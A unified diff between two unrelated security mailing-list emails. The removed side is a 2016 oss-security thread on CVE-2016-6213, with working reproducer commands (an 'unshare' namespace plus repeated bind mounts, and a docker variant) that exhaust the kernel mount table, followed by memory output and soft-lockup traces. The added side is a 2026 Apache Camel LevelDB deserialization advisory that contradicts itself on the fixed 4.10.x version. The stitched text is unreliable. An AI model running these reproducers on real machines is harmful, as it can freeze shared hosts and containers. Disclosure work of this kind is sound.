@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["16662" "Friday" "15" "July" "2016" "10:35:56" "-0400" "CAI Qian" "caiqian@redhat.com" "<503961672.5557412.1468593356552.JavaMail.zimbra@redhat.com>" "271" "Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount" nil nil nil "7" "2016071514:35:56" "[oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount" (number mark "U       caiqian@redh Jul 15  271/16662 " thread-indent "\"Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount\"\n") "<1209678068.4908811.1468512902793.JavaMail.zimbra@redhat.com>" ("<1929364718.4484556.1468421564523.JavaMail.zimbra@redhat.com>" "<20160713165940.E24C88BCE32@smtpvmsrv1.mitre.org>" "<20160713224500.GD12156@kroah.com>" "<1209678068.4908811.1468512902793.JavaMail.zimbra@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 3132 invoked by uid 550); 15 Jul 2016 14:36:10 -0000
+Received: (qmail 16184 invoked by uid 550); 18 Feb 2026 16:38:55 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,291 +7,50 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3094 invoked from network); 15 Jul 2016 14:36:09 -0000
-Date: Fri, 15 Jul 2016 10:35:56 -0400 (EDT)
-From: CAI Qian <caiqian@redhat.com>
-To: oss-security@lists.openwall.com
-Message-ID: <503961672.5557412.1468593356552.JavaMail.zimbra@redhat.com>
-In-Reply-To: <1209678068.4908811.1468512902793.JavaMail.zimbra@redhat.com>
-References: <1929364718.4484556.1468421564523.JavaMail.zimbra@redhat.com> <20160713165940.E24C88BCE32@smtpvmsrv1.mitre.org> <20160713224500.GD12156@kroah.com> <1209678068.4908811.1468512902793.JavaMail.zimbra@redhat.com>
-MIME-Version: 1.0
+x-ms-reactions: disallow
+Received: (qmail 10092 invoked from network); 18 Feb 2026 10:28:53 -0000
+Authentication-Results: apache.org; auth=none
 Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-X-Originating-IP: [10.18.41.13]
-X-Mailer: Zimbra 8.0.6_GA_5922 (ZimbraWebClient - GC45 (Linux)/8.0.6_GA_5922)
-Thread-Topic: cve request: local DoS by overflowing kernel mount table using shared bind mount
-Thread-Index: hOdD4aS2ea/HStlguRP7NCDxcKj4rHs5rOnx
-Subject: Re: [oss-security] Re: cve request: local DoS by overflowing kernel
- mount table using shared bind mount
+From: Andrea Cosentino <acosentino@apache.org>
+To: oss-security@lists.openwall.com
+Message-ID: <881c458b-079c-8968-adc9-1a7ac0f2b85e@apache.org>
+Content-Transfer-Encoding: quoted-printable
+Date: Wed, 18 Feb 2026 10:27:33 +0000
+MIME-Version: 1.0
+Subject: [oss-security] CVE-2026-25747: Apache Camel: Deserialization of Untrusted Data in Camel LevelDB
 
-Also, it is exploitable without docker but with only user namespace enabled.
+Severity: important=20
 
-$ unshare -r -m --propagation shared
-# for i in `seq 1 30`; do mount -o bind ~/src/ ~/des/; done
+Affected versions:
 
-Tested it on this large memory machine. consumed 1.5G memory to create 8388640
-entries in the mount table. Immediately afterwards, NMI watchdog/soft-lockup
-kicked in and the kernel is dead.
-   CAI Qian
+- Apache Camel (org.apache.camel:camel-leveldb) 4.10.0 before 4.10.9
+- Apache Camel (org.apache.camel:camel-leveldb) 4.14.0 before 4.14.5
+- Apache Camel (org.apache.camel:camel-leveldb) 4.15.0 before 4.18.0
 
-$ unshare -m -r --propagation shared
-# for i in `seq 1 30`; do mount -o bind ~/src/ ~/des/; free -m; mount | wc -l ; done
-              total        used        free      shared  buff/cache   available
-Mem:         128493         421      127672           8         399      127326
-Swap:          4095           0        4095
-34
-              total        used        free      shared  buff/cache   available
-Mem:         128493         421      127671           8         399      127325
-Swap:          4095           0        4095
-36
-              total        used        free      shared  buff/cache   available
-Mem:         128493         422      127671           8         399      127324
-Swap:          4095           0        4095
-40
-              total        used        free      shared  buff/cache   available
-Mem:         128493         423      127670           8         399      127324
-Swap:          4095           0        4095
-48
-              total        used        free      shared  buff/cache   available
-Mem:         128493         423      127669           8         399      127323
-Swap:          4095           0        4095
-64
-              total        used        free      shared  buff/cache   available
-Mem:         128493         424      127669           8         399      127322
-Swap:          4095           0        4095
-96
-              total        used        free      shared  buff/cache   available
-Mem:         128493         425      127668           8         399      127322
-Swap:          4095           0        4095
-160
-              total        used        free      shared  buff/cache   available
-Mem:         128493         426      127667           8         399      127321
-Swap:          4095           0        4095
-288
-              total        used        free      shared  buff/cache   available
-Mem:         128493         426      127667           8         399      127320
-Swap:          4095           0        4095
-544
-              total        used        free      shared  buff/cache   available
-Mem:         128493         426      127666           8         400      127320
-Swap:          4095           0        4095
-1056
-              total        used        free      shared  buff/cache   available
-Mem:         128493         426      127665           8         400      127319
-Swap:          4095           0        4095
-2080
-              total        used        free      shared  buff/cache   available
-Mem:         128493         427      127664           8         401      127318
-Swap:          4095           0        4095
-4128
-              total        used        free      shared  buff/cache   available
-Mem:         128493         428      127662           8         403      127316
-Swap:          4095           0        4095
-8224
-              total        used        free      shared  buff/cache   available
-Mem:         128493         428      127658           8         406      127311
-Swap:          4095           0        4095
-16416
-              total        used        free      shared  buff/cache   available
-Mem:         128493         431      127648           8         413      127302
-Swap:          4095           0        4095
-32800
-              total        used        free      shared  buff/cache   available
-Mem:         128493         434      127631           8         428      127284
-Swap:          4095           0        4095
-65568
-              total        used        free      shared  buff/cache   available
-Mem:         128493         443      127594           8         456      127247
-Swap:          4095           0        4095
-131104
-              total        used        free      shared  buff/cache   available
-Mem:         128493         458      127521           8         513      127175
-Swap:          4095           0        4095
-262176
-              total        used        free      shared  buff/cache   available
-Mem:         128493         491      127374           8         627      127028
-Swap:          4095           0        4095
-524320
-              total        used        free      shared  buff/cache   available
-Mem:         128493         559      127081           8         852      126734
-Swap:          4095           0        4095
-1048608
-              total        used        free      shared  buff/cache   available
-Mem:         128493         688      126496           8        1308      126150
-Swap:          4095           0        4095
-2097184
-              total        used        free      shared  buff/cache   available
-Mem:         128493         961      125314           8        2216      124968
-Swap:          4095           0        4095
-4194336
-              total        used        free      shared  buff/cache   available
-Mem:         128493        1506      122953           8        4033      122607
-Swap:          4095           0        4095
-8388640
+Description:
 
-Message from syslogd@ibm-x3755-02 at Jul 14 17:01:52 ...
- kernel:NMI watchdog: BUG: soft lockup - CPU#12 stuck for 23s! [mount:4250]
+Deserialization of Untrusted Data vulnerability in Apache Camel LevelDB com=
+ponent.
 
-Message from syslogd@ibm-x3755-02 at Jul 14 17:01:52 ...
- kernel:NMI watchdog: BUG: soft lockup - CPU#0 stuck for 22s! [NetworkManager:1971]
+This issue affects Apache Camel: from 4.10.0 before 4.10.8, from 4.14.0 bef=
+ore 4.14.5, from 4.15.0 before 4.18.0.
 
-Message from syslogd@ibm-x3755-02 at Jul 14 17:01:52 ...
- kernel:NMI watchdog: BUG: soft lockup - CPU#3 stuck for 23s! [systemd-journal:1749]
-              total        used        free      shared  buff/cache   available
-Mem:         128493        2600      118223           8        7669      117877
-Swap:          4095           0        4095
+Users are recommended to upgrade to version 4.18.0, which fixes the issue. =
+For the 4.10.x LTS releases, users are recommended to upgrade to 4.10.9, wh=
+ile for 4.14.x LTS releases, users are recommended to upgrade to 4.14.5
 
-Message from syslogd@ibm-x3755-02 at Jul 14 17:01:52 ...
- kernel:NMI watchdog: BUG: soft lockup - CPU#4 stuck for 23s! [irqbalance:1972]
+This issue is being tracked as CAMEL-22966=20
 
-Message from syslogd@ibm-x3755-02 at Jul 14 17:01:52 ...
- kernel:NMI watchdog: BUG: soft lockup - CPU#14 stuck for 22s! [sendmail:2533]
+Credit:
 
-[ 5773.628802] NMI watchdog: BUG: soft lockup - CPU#12 stuck for 23s! [mount:4250]
-[ 5773.636139] Modules linked in: ipmi_ssif nfsd kvm_amd kvm auth_rpcgss nfs_acl ses lockd enclosure ipmi_devintf scsi_transport_sas irqbypass ipmi_si ibmpex ibmaem sg shpchp ipmi_msghandler i2c_piix4 k10temp pcspkr acpi_cpufreq grace sunrpc ip_tables xfs libcrc32c sd_mod sr_mod cdrom radeon i2c_algo_bit drm_kms_helper syscopyarea sysfillrect sysimgblt ata_generic fb_sys_fops ixgbe pata_acpi ttm e1000e lpfc drm mdio pata_serverworks dca aacraid libata ptp serio_raw bnx2 scsi_transport_fc pps_core i2c_core dm_mirror dm_region_hash dm_log dm_mod
-[ 5773.685984] CPU: 12 PID: 4250 Comm: mount Not tainted 4.7.0-rc7 #1
-[ 5773.692176] Hardware name: IBM IBM System x3755 -[71635RU]-/System Planar, BIOS IBM BIOS Version 1.04 -[C8E133AUS-1.04]- 08/31/2009
-[ 5773.704001] task: ffff8807f5968000 ti: ffff880731310000 task.ti: ffff880731310000
-[ 5773.711485] RIP: 0010:[<ffffffff8123ac38>]  [<ffffffff8123ac38>] __lookup_mnt+0x58/0x80
-[ 5773.719535] RSP: 0018:ffff880731313dc0  EFLAGS: 00000282
-[ 5773.724862] RAX: ffff8807e0e75980 RBX: ffff8817b6e36420 RCX: 0000000000000012
-[ 5773.732005] RDX: ffff881780933d80 RSI: ffff8807fb7af500 RDI: ffff8817b6e36420
-[ 5773.739146] RBP: ffff880731313dc0 R08: 0000000000000000 R09: ffffe8ffdfd82ae0
-[ 5773.746293] R10: 0000000000001570 R11: 0000000000002ad9 R12: ffff8807fb7af500
-[ 5773.753428] R13: ffff881ff97835c0 R14: 0000000000000000 R15: 0000000000000000
-[ 5773.760574] FS:  00007fa36b919880(0000) GS:ffff88201fc00000(0000) knlGS:0000000000000000
-[ 5773.768663] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[ 5773.774443] CR2: 00007f8bedaba000 CR3: 0000000fc9707000 CR4: 00000000000006e0
-[ 5773.781587] Stack:
-[ 5773.783615]  ffff880731313de0 ffffffff8123ac77 ffff88178f268300 ffff88178f268180
-[ 5773.791116]  ffff880731313e28 ffffffff8123b1bb ffff88178f268180 00000000ad5522bc
-[ 5773.798639]  ffff881ff97835c0 ffff881fc90eb1a0 ffff880fc7d0a880 0000000000000000
-[ 5773.806168] Call Trace:
-[ 5773.808632]  [<ffffffff8123ac77>] __lookup_mnt_last+0x17/0x80
-[ 5773.814402]  [<ffffffff8123b1bb>] attach_recursive_mnt+0x10b/0x230
-[ 5773.820584]  [<ffffffff8123b32f>] graft_tree+0x4f/0x60
-[ 5773.825737]  [<ffffffff8123ca43>] do_mount+0xc33/0xdb0
-[ 5773.830887]  [<ffffffff811f69af>] ? __kmalloc_track_caller+0x1af/0x250
-[ 5773.837424]  [<ffffffff811afb71>] ? strndup_user+0x41/0x80
-[ 5773.842918]  [<ffffffff811afa92>] ? memdup_user+0x42/0x70
-[ 5773.848328]  [<ffffffff8123ced3>] SyS_mount+0x83/0xd0
-[ 5773.853403]  [<ffffffff81003b12>] do_syscall_64+0x62/0x110
-[ 5773.858910]  [<ffffffff816c6921>] entry_SYSCALL64_slow_path+0x25/0x25
-[ 5773.865364] Code: b2 00 48 8b 15 12 2e b2 00 48 8d 04 c2 48 8b 10 31 c0 48 85 d2 75 10 5d c3 48 39 72 18 74 21 48 8b 12 48 85 d2 74 15 48 8b 42 10 <48> 83 c0 20 48 39 c7 74 e5 48 8b 12 48 85 d2 75 eb 31 c0 5d c3 
-[ 5780.883837] NMI watchdog: BUG: soft lockup - CPU#0 stuck for 22s! [NetworkManager:1971]
-[ 5780.891840] Modules linked in: ipmi_ssif nfsd kvm_amd kvm auth_rpcgss nfs_acl ses lockd enclosure ipmi_devintf scsi_transport_sas irqbypass ipmi_si ibmpex ibmaem sg shpchp ipmi_msghandler i2c_piix4 k10temp pcspkr acpi_cpufreq grace sunrpc ip_tables xfs libcrc32c sd_mod sr_mod cdrom radeon i2c_algo_bit drm_kms_helper syscopyarea sysfillrect sysimgblt ata_generic fb_sys_fops ixgbe pata_acpi ttm e1000e lpfc drm mdio pata_serverworks dca aacraid libata ptp serio_raw bnx2 scsi_transport_fc pps_core i2c_core dm_mirror dm_region_hash dm_log dm_mod
-[ 5780.940715] CPU: 0 PID: 1971 Comm: NetworkManager Tainted: G             L  4.7.0-rc7 #1
-[ 5780.948798] Hardware name: IBM IBM System x3755 -[71635RU]-/System Planar, BIOS IBM BIOS Version 1.04 -[C8E133AUS-1.04]- 08/31/2009
-[ 5780.960609] task: ffff8817f9508000 ti: ffff8817f9ba8000 task.ti: ffff8817f9ba8000
-[ 5780.968089] RIP: 0010:[<ffffffff812253e3>]  [<ffffffff812253e3>] path_init+0x2b3/0x340
-[ 5780.976037] RSP: 0018:ffff8817f9babc90  EFLAGS: 00000202
-[ 5780.981347] RAX: 0000000002000521 RBX: ffff8817f9babdb0 RCX: ffff8807f9853e00
-[ 5780.988478] RDX: ffffffff8221bbc8 RSI: 0000000000000041 RDI: ffff8817f9babdb0
-[ 5780.995608] RBP: ffff8817f9babcc0 R08: 000000000001b2c0 R09: ffff8807f9699180
-[ 5781.002732] R10: 0000000000000020 R11: 0000000000000020 R12: 0000000000000041
-[ 5781.009863] R13: ffff8807fbc9a01c R14: 000000007fffffff R15: ffff8817f9babdb0
-[ 5781.016988] FS:  00007f422f41d8c0(0000) GS:ffff8807ffc00000(0000) knlGS:0000000000000000
-[ 5781.025072] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[ 5781.030818] CR2: 00007f8bed0c6fed CR3: 0000000ff898d000 CR4: 00000000000006f0
-[ 5781.037950] Stack:
-[ 5781.039969]  ffff8807f926b140 0000000000000011 ffff8817f9babecc ffff8817f9babecc
-[ 5781.047430]  000000007fffffff ffff8817f9babdb0 ffff8817f9babda0 ffffffff81227391
-[ 5781.054891]  0000001c00000000 0000000003082263 ffffffff8159588d 0000000003082263
-[ 5781.062350] Call Trace:
-[ 5781.064799]  [<ffffffff81227391>] path_openat+0x81/0x1370
-[ 5781.070202]  [<ffffffff8159588d>] ? move_addr_to_user+0x8d/0xc0
-[ 5781.071838] NMI watchdog: BUG: soft lockup - CPU#3 stuck for 23s! [systemd-journal:1749]
-[ 5781.071872] Modules linked in: ipmi_ssif nfsd kvm_amd kvm auth_rpcgss nfs_acl ses lockd enclosure ipmi_devintf scsi_transport_sas irqbypass ipmi_si ibmpex ibmaem sg shpchp ipmi_msghandler i2c_piix4 k10temp pcspkr acpi_cpufreq grace sunrpc ip_tables xfs libcrc32c sd_mod sr_mod cdrom radeon i2c_algo_bit drm_kms_helper syscopyarea sysfillrect sysimgblt ata_generic fb_sys_fops ixgbe pata_acpi ttm e1000e lpfc drm mdio pata_serverworks dca aacraid libata ptp serio_raw bnx2 scsi_transport_fc pps_core i2c_core dm_mirror dm_region_hash dm_log dm_mod
-[ 5781.071876] CPU: 3 PID: 1749 Comm: systemd-journal Tainted: G             L  4.7.0-rc7 #1
-[ 5781.071877] Hardware name: IBM IBM System x3755 -[71635RU]-/System Planar, BIOS IBM BIOS Version 1.04 -[C8E133AUS-1.04]- 08/31/2009
-[ 5781.071879] task: ffff8807f7906680 ti: ffff881ff8828000 task.ti: ffff881ff8828000
-[ 5781.071891] RIP: 0010:[<ffffffff812253db>]  [<ffffffff812253db>] path_init+0x2ab/0x340
-[ 5781.071892] RSP: 0018:ffff881ff882ba88  EFLAGS: 00000202
-[ 5781.071893] RAX: 0000000002000521 RBX: ffff881ff882baf0 RCX: ffff881ff882bc30
-[ 5781.071894] RDX: ffff881ff882bc30 RSI: 0000000000000041 RDI: ffff881ff882baf0
-[ 5781.071895] RBP: ffff881ff882bab8 R08: 0000000000000000 R09: ffffffff812286ab
-[ 5781.071896] R10: ffff8807ff8032c0 R11: 0000000000000016 R12: 0000000000000041
-[ 5781.071897] R13: ffff8807f9e9601c R14: 0000000000000001 R15: 000000000000000a
-[ 5781.071898] FS:  00007f1f25f29880(0000) GS:ffff8807ffd80000(0000) knlGS:0000000000000000
-[ 5781.071900] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[ 5781.071900] CR2: 00007f4ed9306000 CR3: 0000000ff97ba000 CR4: 00000000000006e0
-[ 5781.071901] Stack:
-[ 5781.071903]  ffffffff810b3929 ffff881ff882baf0 ffff881ff882bc30 ffff881ff882bc30
-[ 5781.071905]  0000000000000001 000000000000000a ffff881ff882bae0 ffffffff81226ffb
-[ 5781.071906]  ffff8807ff8032c0 0000000000000001 ffff8807f9e96000 ffff881ff882bbf0
-[ 5781.071907] Call Trace:
-[ 5781.071916]  [<ffffffff810b3929>] ? ttwu_do_wakeup+0x19/0xe0
-[ 5781.071920]  [<ffffffff81226ffb>] path_lookupat+0x1b/0x110
-[ 5781.071922]  [<ffffffff81228c3f>] filename_lookup+0xaf/0x190
-[ 5781.071930]  [<ffffffff8159de11>] ? __kmalloc_reserve.isra.35+0x31/0x90
-[ 5781.071933]  [<ffffffff8159fbe1>] ? __alloc_skb+0xa1/0x2b0
-[ 5781.071936]  [<ffffffff811f329b>] ? kmem_cache_alloc+0x18b/0x1f0
-[ 5781.071937]  [<ffffffff812286ab>] ? getname_kernel+0x2b/0x110
-[ 5781.071939]  [<ffffffff81228d4b>] kern_path+0x2b/0x30
-[ 5781.071948]  [<ffffffff816642c5>] unix_find_other+0x45/0x240
-[ 5781.071951]  [<ffffffff815a5d0a>] ? skb_copy_datagram_from_iter+0x5a/0x1f0
-[ 5781.071953]  [<ffffffff81664fa1>] unix_dgram_sendmsg+0x451/0x690
-[ 5781.071956]  [<ffffffff81596af8>] sock_sendmsg+0x38/0x50
-[ 5781.071957]  [<ffffffff81597449>] ___sys_sendmsg+0x279/0x290
-[ 5781.071958]  [<ffffffff811f3401>] ? kmem_cache_alloc_trace+0x101/0x210
-[ 5781.071960]  [<ffffffff811f32e6>] ? kmem_cache_alloc+0x1d6/0x1f0
-[ 5781.071966]  [<ffffffff812cd5d7>] ? selinux_file_alloc_security+0x37/0x60
-[ 5781.071968]  [<ffffffff812cd5d7>] ? selinux_file_alloc_security+0x37/0x60
-[ 5781.071974]  [<ffffffff812c7543>] ? security_file_alloc+0x33/0x50
-[ 5781.071981]  [<ffffffff8121b3cf>] ? get_empty_filp+0xcf/0x1a0
-[ 5781.071983]  [<ffffffff81597e54>] __sys_sendmsg+0x54/0x90
-[ 5781.071984]  [<ffffffff81597ea2>] SyS_sendmsg+0
+Andrea Cosentino (finder)
+Andrea Cosentino (remediation developer)
 
------ Original Message -----
-> From: "CAI Qian" <caiqian@redhat.com>
-> To: "Greg KH" <greg@kroah.com>
-> Cc: oss-security@lists.openwall.com, cve-assign@mitre.org
-> Sent: Thursday, July 14, 2016 12:15:02 PM
-> Subject: Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount
-> 
-> Maybe this is a better reproducer using docker. It is exploitable even with
-> user namespace enabled.
-> 
-> # docker run -it -v /mnt/:/mnt/:shared --cap-add=SYS_ADMIN rhel7 /bin/bash
-> 
-> # cat /proc/self/uid_map
->          0        995      65536
-> 
-> # cat /proc/self/gid_map
->          0        992      65536
-> 
-> (insider container) # for i in `seq 1 20`; mount -o bind /mnt/1 /mnt/2; done
->    CAI Qian
-> 
-> ----- Original Message -----
-> > From: "Greg KH" <greg@kroah.com>
-> > To: oss-security@lists.openwall.com
-> > Cc: caiqian@redhat.com, cve-assign@mitre.org
-> > Sent: Wednesday, July 13, 2016 6:45:00 PM
-> > Subject: Re: [oss-security] Re: cve request: local DoS by overflowing
-> > kernel mount table using shared bind mount
-> > 
-> > On Wed, Jul 13, 2016 at 12:59:40PM -0400, cve-assign@mitre.org wrote:
-> > > > It was reported that the mount table expands by a power-of-two
-> > > > with each bind mount command.
-> > > 
-> > > > If the system is configured in the way that a non-root user
-> > > > allows bind mount even if with limit number of bind mount
-> > > > allowed, a non-root user could cause a local DoS by quickly
-> > > > overflow the mount table.
-> > > 
-> > > > it will cause a deadlock for the whole system,
-> > > 
-> > > >> form of unlimited memory consumption that is causing the problem
-> > > 
-> > > Use CVE-2016-6213.
-> > 
-> > A CVE for an "improperly configured system"?  Huh?  What distro has such
-> > a configuration set by default?  This isn't a kernel bug, so what is
-> > this CVE classified as being "against"?  It better not be against the
-> > Linux kernel...
-> > 
-> > confused,
-> > 
-> > greg k-h
-> >
+References:
+
+https://github.com/oscerd/CVE-2026-25747
+https://camel.apache.org/security/CVE-2026-25747.html
+https://camel.apache.org/
+https://www.cve.org/CVERecord?id=3DCVE-2026-25747
+https://issues.apache.org/jira/browse/CAMEL-22966
+
